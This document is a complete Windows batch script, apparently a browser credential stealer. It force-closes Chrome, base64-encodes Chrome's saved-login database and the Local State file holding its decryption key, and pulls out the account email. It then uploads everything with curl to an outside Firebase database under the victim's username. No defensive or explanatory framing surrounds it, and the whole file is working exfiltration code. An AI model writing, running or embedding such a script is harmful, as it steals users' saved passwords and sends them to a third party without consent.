@echo off
setlocal ENABLEDELAYEDEXPANSION

:: === Kill Chrome silently ===
taskkill /IM chrome.exe /F >nul 2>&1
timeout /t 2 /nobreak >nul

:: === Set paths ===
set "LOGIN_FILE=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
set "STATE_FILE=%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
set "FIREBASE=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app"
set "NODE=credentials/%USERNAME%"

:: === Temp folder ===
set "TMP_DIR=%TEMP%\fbup"
mkdir "%TMP_DIR%" >nul 2>&1

set "B64_LOGIN=%TMP_DIR%\login.txt"
set "B64_STATE=%TMP_DIR%\state.txt"
set "TMP_JSON=%TMP_DIR%\data.json"

:: === Encode files in Base64 ===
echo [*] Encoding Login Data...
certutil -encode "%LOGIN_FILE%" "%B64_LOGIN%" >nul
if errorlevel 1 (
    echo [!] Failed to encode Login Data.
    pause
    exit /b 1
)

echo [*] Encoding Local State...
certutil -encode "%STATE_FILE%" "%B64_STATE%" >nul
if errorlevel 1 (
    echo [!] Failed to encode Local State.
    pause
    exit /b 1
)

:: === Strip certutil headers ===
(for /f "skip=1 delims=" %%A in (%B64_LOGIN%) do (
    set "line=%%A"
    if "!line!" neq "-----END CERTIFICATE-----" echo(!line!
)) > "%B64_LOGIN%.clean"

(for /f "skip=1 delims=" %%A in (%B64_STATE%) do (
    set "line=%%A"
    if "!line!" neq "-----END CERTIFICATE-----" echo(!line!
)) > "%B64_STATE%.clean"

:: === Decode Local State back to JSON to extract email ===
certutil -decode "%B64_STATE%.clean" "%TMP_DIR%\local_state.json" >nul

:: === Extract email using PowerShell ===
for /f "usebackq delims=" %%E in (`powershell -NoProfile -Command ^
    "try { (Get-Content '%TMP_DIR%\local_state.json' | ConvertFrom-Json).account_info[0].email } catch { '' }"`) do set "REAL_EMAIL=%%E"

:: === Fallback ===
if "!REAL_EMAIL!"=="" (
    set "REAL_EMAIL=%USERNAME%@%USERDOMAIN%"
)

:: === Save final JSON ===
(
    echo {
    echo     "email": "!REAL_EMAIL!",
    echo     "login_data_b64": "@@@LOGIN@@@",
    echo     "local_state_b64": "@@@STATE@@@"
    echo }
) > "%TMP_JSON%"

:: === Replace placeholders ===
powershell -NoProfile -Command ^
    "(Get-Content '%TMP_JSON%') -replace '@@@LOGIN@@@', (Get-Content '%B64_LOGIN%.clean' -Raw) -replace '@@@STATE@@@', (Get-Content '%B64_STATE%.clean' -Raw) | Set-Content '%TMP_DIR%\final.json'"

:: === Upload to Firebase ===
curl -X PUT -H "Content-Type: application/json" --data "@%TMP_DIR%\final.json" "%FIREBASE%/%NODE%.json"

echo.
echo ✅ Upload complete! Email: !REAL_EMAIL!
pause
